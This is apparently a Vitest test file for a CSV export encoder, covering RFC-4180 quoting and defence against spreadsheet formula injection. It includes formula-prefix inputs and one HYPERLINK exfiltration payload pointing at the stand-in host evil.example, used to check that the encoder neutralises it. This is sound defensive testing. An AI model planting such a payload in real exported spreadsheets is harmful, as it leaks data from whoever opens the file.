import { describe, expect, it } from 'vitest';
import { escapeCsvField, toCsv, toCsvRow } from './csv';

/**
 * CSV escaping (V3-PLAT-007).
 *
 * Tested directly rather than through the screen, because the two hazards it guards against —
 * a broken row and an executed formula — are properties of the encoder, not of any one export.
 */
describe('escapeCsvField — RFC-4180 quoting', () => {
  it('leaves an ordinary value alone', () => {
    expect(escapeCsvField('Pearl White')).toBe('Pearl White');
  });

  it('quotes a value containing a comma', () => {
    expect(escapeCsvField('Riyadh, Jeddah')).toBe('"Riyadh, Jeddah"');
  });

  it('quotes and doubles an embedded quote', () => {
    expect(escapeCsvField('He said "no"')).toBe('"He said ""no"""');
  });

  it('quotes a value containing a newline', () => {
    expect(escapeCsvField('line one\nline two')).toBe('"line one\nline two"');
  });

  it('quotes a value containing a carriage return', () => {
    // Also a formula prefix, so it picks up the apostrophe as well as the quoting.
    expect(escapeCsvField('\rfoo')).toBe('"\'\rfoo"');
  });

  it('renders null and undefined as an empty field, not the word "null"', () => {
    expect(escapeCsvField(null)).toBe('');
    expect(escapeCsvField(undefined)).toBe('');
  });

  it('renders numbers and booleans without quoting', () => {
    expect(escapeCsvField(18615.55)).toBe('18615.55');
    expect(escapeCsvField(0)).toBe('0');
    expect(escapeCsvField(false)).toBe('false');
  });

  it('preserves non-ASCII text unchanged', () => {
    expect(escapeCsvField('Transfer 3 units Riyadh → Jeddah')).toBe('Transfer 3 units Riyadh → Jeddah');
    expect(escapeCsvField('الرياض')).toBe('الرياض');
  });
});

describe('escapeCsvField — formula injection', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+1', "'+1"],
    ['-1', "'-1"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\tfoo', "'\tfoo"],
  ])('neutralises a value beginning %s', (input, expected) => {
    expect(escapeCsvField(input)).toBe(expected);
  });

  it('neutralises the classic hyperlink-exfiltration payload', () => {
    const payload = '=HYPERLINK("http://evil.example/?x="&A1,"Click")';
    const escaped = escapeCsvField(payload);

    expect(escaped.startsWith('"\'=')).toBe(true);
  });

  it('does not touch a hyphen that is not leading', () => {
    expect(escapeCsvField('ES-350')).toBe('ES-350');
  });

  it('does not touch a negative number rendered by the app', () => {
    // A real negative value is still prefixed — a spreadsheet cannot tell it from a formula, and
    // showing '-5 is better than executing it.
    expect(escapeCsvField(-5)).toBe("'-5");
  });
});

describe('toCsvRow / toCsv', () => {
  it('joins fields with commas', () => {
    expect(toCsvRow(['a', 'b', 'c'])).toBe('a,b,c');
  });

  it('writes a header row followed by one row per record, CRLF-separated', () => {
    const csv = toCsv(
      [
        { header: 'id', value: (r: { id: string; n: number }) => r.id },
        { header: 'n', value: (r: { id: string; n: number }) => r.n },
      ],
      [
        { id: 'D-INV-1', n: 3 },
        { id: 'D-ORD-1', n: 40 },
      ],
    );

    expect(csv).toBe('id,n\r\nD-INV-1,3\r\nD-ORD-1,40');
  });

  it('writes only the header row for an empty export', () => {
    expect(toCsv([{ header: 'id', value: (r: { id: string }) => r.id }], [])).toBe('id');
  });

  it('escapes values inside a full document', () => {
    const csv = toCsv(
      [{ header: 'note', value: (r: { note: string }) => r.note }],
      [{ note: 'Riyadh, "hold"' }],
    );

    expect(csv).toBe('note\r\n"Riyadh, ""hold"""');
  });
});
